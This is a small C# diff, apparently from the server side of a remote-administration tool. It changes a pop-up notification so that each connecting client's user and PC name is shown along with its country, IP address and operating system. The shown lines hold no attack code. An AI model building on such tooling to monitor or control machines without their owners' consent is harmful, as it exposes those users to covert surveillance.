@@ -415,7 +415,7 @@ namespace xServer.Forms
                 {
                     if (c == null || c.Value == null) return;
                     
-                    notifyIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
+                    notifyIcon.ShowBalloonTip(30, string.Format("Client {0} connected from {1}!", c.Value.UserAtPc, c.Value.Country),
                         string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                         c.Value.OperatingSystem), ToolTipIcon.Info);
                 });
